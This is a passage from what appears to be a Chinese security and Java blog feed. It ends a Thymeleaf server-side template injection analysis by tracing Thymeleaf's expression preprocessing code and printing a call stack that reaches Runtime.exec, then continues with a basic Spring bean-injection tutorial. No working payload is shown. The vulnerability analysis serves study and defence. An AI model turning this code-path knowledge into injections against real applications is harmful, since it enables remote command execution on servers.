class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TemplateProcessingException</span>(<span class="string">&quot;Could not parse as expression: \&quot;&quot;</span> + input + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将解析得到的表达式对象放入表达式缓存中</span></span><br><span class="line">    ExpressionCache.putExpressionIntoCache(configuration, preprocessedInput, expression);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> expression;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入StandardExpressionPreprocessor.preprocess</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">char</span> <span class="variable">PREPROCESS_DELIMITER</span> <span class="operator">=</span> <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PREPROCESS_EVAL</span> <span class="operator">=</span> <span class="string">&quot;\\_\\_(.*?)\\_\\_&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">PREPROCESS_EVAL_PATTERN</span> <span class="operator">=</span> Pattern.compile(PREPROCESS_EVAL, Pattern.DOTALL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> String <span class="title function_">preprocess</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> IExpressionContext context,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> String input)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查输入字符串中是否包含预处理分隔符_,不包含则直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (input.indexOf(PREPROCESS_DELIMITER) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// Fail quick</span></span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查其是否为 StandardExpressionParser 的实例。因为预处理器依赖于特定的解析器实现，所以只有当解析器为 StandardExpressionParser 时，才能进行预处理</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">IStandardExpressionParser</span> <span class="variable">expressionParser</span> <span class="operator">=</span> StandardExpressions.getExpressionParser(context.getConfiguration());</span><br><span class="line">    <span class="keyword">if</span> (!(expressionParser <span class="keyword">instanceof</span> StandardExpressionParser)) &#123;</span><br><span class="line">        <span class="comment">// Preprocess will be only available for the StandardExpressionParser, because the preprocessor</span></span><br><span class="line">        <span class="comment">// depends on this specific implementation of the parser.</span></span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 使用预处理正则表达式模式（PREPROCESS_EVAL_PATTERN）对输入字符串进行匹配</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> PREPROCESS_EVAL_PATTERN.matcher(input);</span><br><span class="line">    <span class="comment">// 如果找到匹配的预处理标记，则创建一个 StringBuilder 对象（strBuilder）用于构建预处理后的字符串</span></span><br><span class="line">    <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">strBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(input.length() + <span class="number">24</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">curr</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 使用循环遍历所有匹配的预处理标记</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// 提取出前一个标记之后的文本（previousText）和表达式文本（expressionText），并将前一个标记之后的文本追加到 strBuilder 中</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">previousText</span> <span class="operator">=</span> </span><br><span class="line">                    checkPreprocessingMarkUnescaping(input.substring(curr,matcher.start(<span class="number">0</span>)));</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">expressionText</span> <span class="operator">=</span> </span><br><span class="line">                    checkPreprocessingMarkUnescaping(matcher.group(<span class="number">1</span>));</span><br><span class="line">                    </span><br><span class="line">            strBuilder.append(previousText);</span><br><span class="line">            <span class="comment">// parseExpression 方法解析表达式文本，得到表达式对象（expression）</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">IStandardExpression</span> <span class="variable">expression</span> <span class="operator">=</span></span><br><span class="line">                    StandardExpressionParser.parseExpression(context, expressionText, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (expression == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 调用表达式对象的 execute 方法执行表达式，并将执行结果追加到 strBuilder 中</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression.execute(context, StandardExpressionExecutionContext.RESTRICTED);</span><br><span class="line">            </span><br><span class="line">            strBuilder.append(result);</span><br><span class="line">            </span><br><span class="line">            curr = matcher.end(<span class="number">0</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">while</span> (matcher.find());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">remaining</span> <span class="operator">=</span> checkPreprocessingMarkUnescaping(input.substring(curr));</span><br><span class="line">        </span><br><span class="line">        strBuilder.append(remaining);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> strBuilder.toString().trim();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> checkPreprocessingMarkUnescaping(input);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230916152738.png"><br>进入Expression类的execute方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">execute</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> IExpressionContext context,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> StandardExpressionExecutionContext expContext)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Validate.notNull(context, <span class="string">&quot;Context cannot be null&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">IStandardVariableExpressionEvaluator</span> <span class="variable">variableExpressionEvaluator</span> <span class="operator">=</span></span><br><span class="line">            StandardExpressions.getVariableExpressionEvaluator(context.getConfiguration());</span><br><span class="line">    <span class="comment">// 这里</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> execute(context, <span class="built_in">this</span>, variableExpressionEvaluator, expContext);</span><br><span class="line">    <span class="keyword">return</span> LiteralValue.unwrap(result);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逐步会到SimpleExpression类的executeSimple方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230916153522.png"><br>之后的链会一直到达命名执行函数<br><strong>函数调用栈</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">443</span>, Runtime (java.lang)</span><br><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">execute:<span class="number">129</span>, ReflectiveMethodExecutor (org.springframework.expression.spel.support)</span><br><span class="line">getValueInternal:<span class="number">139</span>, MethodReference (org.springframework.expression.spel.ast)</span><br><span class="line">getValueInternal:<span class="number">95</span>, MethodReference (org.springframework.expression.spel.ast)</span><br><span class="line">getValueRef:<span class="number">61</span>, CompoundExpression (org.springframework.expression.spel.ast)</span><br><span class="line">getValueInternal:<span class="number">91</span>, CompoundExpression (org.springframework.expression.spel.ast)</span><br><span class="line">createNewInstance:<span class="number">114</span>, ConstructorReference (org.springframework.expression.spel.ast)</span><br><span class="line">getValueInternal:<span class="number">100</span>, ConstructorReference (org.springframework.expression.spel.ast)</span><br><span class="line">getValueRef:<span class="number">55</span>, CompoundExpression (org.springframework.expression.spel.ast)</span><br><span class="line">getValueInternal:<span class="number">91</span>, CompoundExpression (org.springframework.expression.spel.ast)</span><br><span class="line">getValue:<span class="number">112</span>, SpelNodeImpl (org.springframework.expression.spel.ast)</span><br><span class="line">getValue:<span class="number">337</span>, SpelExpression (org.springframework.expression.spel.standard)</span><br><span class="line">evaluate:<span class="number">263</span>, SPELVariableExpressionEvaluator (org.thymeleaf.spring5.expression)</span><br><span class="line">executeVariableExpression:<span class="number">166</span>, VariableExpression (org.thymeleaf.standard.expression)</span><br><span class="line">executeSimple:<span class="number">66</span>, SimpleExpression (org.thymeleaf.standard.expression)</span><br><span class="line">execute:<span class="number">109</span>, Expression (org.thymeleaf.standard.expression)</span><br><span class="line">execute:<span class="number">138</span>, Expression (org.thymeleaf.standard.expression)</span><br><span class="line">preprocess:<span class="number">91</span>, StandardExpressionPreprocessor (org.thymeleaf.standard.expression)</span><br><span class="line">parseExpression:<span class="number">120</span>, StandardExpressionParser (org.thymeleaf.standard.expression)</span><br><span class="line">parseExpression:<span class="number">62</span>, StandardExpressionParser (org.thymeleaf.standard.expression)</span><br><span class="line">parseExpression:<span class="number">44</span>, StandardExpressionParser (org.thymeleaf.standard.expression)</span><br><span class="line">renderFragment:<span class="number">278</span>, ThymeleafView (org.thymeleaf.spring5.view)</span><br><span class="line">render:<span class="number">189</span>, ThymeleafView (org.thymeleaf.spring5.view)</span><br><span class="line">render:<span class="number">1373</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processDispatchResult:<span class="number">1118</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doDispatch:<span class="number">1057</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">943</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:<span class="number">898</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">626</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">733</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">231</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">119</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">119</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">119</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">202</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">97</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">542</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">143</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">374</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">868</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1590</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1142</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/CoLo/p/15507738.html">Java安全之Thymeleaf SSTI分析 - Zh1z3ven - 博客园 (cnblogs.com)</a><br><a href="https://xz.aliyun.com/t/10514">Thymeleaf SSTI漏洞分析</a><br><a href="https://www.cnblogs.com/nice0e3/p/16212784.html">Java安全之Thymeleaf 模板注入分析</a><br><a href="https://developer.aliyun.com/article/769977">Thymeleaf一篇就够了-阿里云开发者社区 (aliyun.com)</a><br><a href="https://paper.seebug.org/1332/">java 安全开发之 spring boot Thymeleaf 模板注入 (seebug.org)</a></p>
<blockquote>
<p>注：本文首发于<a href="https://xz.aliyun.com/t/12969">https://xz.aliyun.com/t/12969</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础之Spring框架</title>
    <url>/2022/11/29/Java-Spring/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Spring是一个开源框架，Spring是于2003 年兴起的一个轻量级的Java 开发框架，由Rod Johnson 在其著作Expert One-On-One J2EE Development and Design中阐述的部分理念和原型衍生而来。</p>
<p>Spring使用基本的JavaBean来完成以前只可能由EJB完成的事情。然而，Spring的用途不仅限于服务器端的开发。从简单性、可测试性和松耦合的角度而言，任何Java应用都可以从Spring中受益。<strong>Spring的核心是控制反转（IoC）和面向切面（AOP）。</strong></p>
<h1 id="Spring使用"><a href="#Spring使用" class="headerlink" title="Spring使用"></a>Spring使用</h1><ol>
<li><p>创建maven工程，在pom.xml中添加spring依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>创建User类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String username, <span class="type">int</span> age, String address, Date date)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">        <span class="built_in">this</span>.date = date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddress</span><span class="params">(String address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Date <span class="title function_">getDate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, address=&#x27;&quot;</span> + address + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, date=&quot;</span> + date +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDate</span><span class="params">(Date date)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.date = date;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建Spring配置文件applicationContext.xml，在配置文件中加入User bean</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.User&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>test</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.example.learn.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 实例化一个容器</span></span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) cl.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// User user = cl.getBean(&quot;user&quot;, User.class);</span></span><br><span class="line">        System.out.print(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="基本属性注入"><a href="#基本属性注入" class="headerlink" title="基本属性注入"></a>基本属性注入</h1><h2 id="构造注入"><a href="#构造注入" class="headerlink" title="构造注入"></a>构造注入</h2><p>平时都是在new的时候或者使用set方法对其进行赋值，在spring框架下，只需要配置xml文件就能进行构造器的注入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.User&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;zhangshan&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;18&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Beijing&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;date&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;now&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;now&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.util.Date&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>注：</strong>类中需要提供一个对应参数列表的构造函数</p>
<blockquote>
<p><strong>constructor-arg标签属性：</strong></p>
<p>index:指定参数在构造函数参数列表的索引位置 </p>
<p>type:指定参数在构造函数中的数据类型 </p>
<p>name:指定参数在构造函数中的名称  </p>
<p>value:它能赋的值是基本数据类型和 String 类型 </p>
<p>ref:它能赋的值是其他 bean 类型，也就是说，必须得是在配置文件中配置过的 bean</p>
</blockquote>
<h2 id="Set注入"><a href="#Set注入" class="headerlink" title="Set注入"></a>Set注入</h2><p>配置xml文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Set注入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.learn.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;lisi&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;18&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Beijing&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;date&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;now&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;now&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.util.Date&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>property标签属性:</strong></p>
<p>name：找的是类中 set 方法后面的部分<br>ref：给属性赋值是其他 bean 类型的<br>value：给属性赋值是基本数据类型和 string 类型的<br>实际开发中，此种方式用的较多。</p>
</blockquote>
<h1 id="Java配置"><a href="#Java配置" class="headerlink" title="Java配置"></a>Java配置</h1><p>在Spring中，将一个Bean注册到Spring容器中，有三种不同的方式：</p>
<ul>
<li>xml注入（如第3节所述）</li>
<li>Java配置（本节所述）</li>
<li>自动化扫描</li>
</ul>
<p>下面有一个Bean：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SayHello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Java中，使用一个Java配置类代替之前的XML配置文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个注解表示这不是一个普通的类，这是一个配置类，相当于Spring的配置文件</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Javaconfig</span> &#123;</span><br><span class="line">    <span class="comment">// 将这个方法的返回值注入到Spring容器中</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    SayHello <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SayHello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试：在项目启动时，加载配置类，将Bean注册到Spring容器中</p>
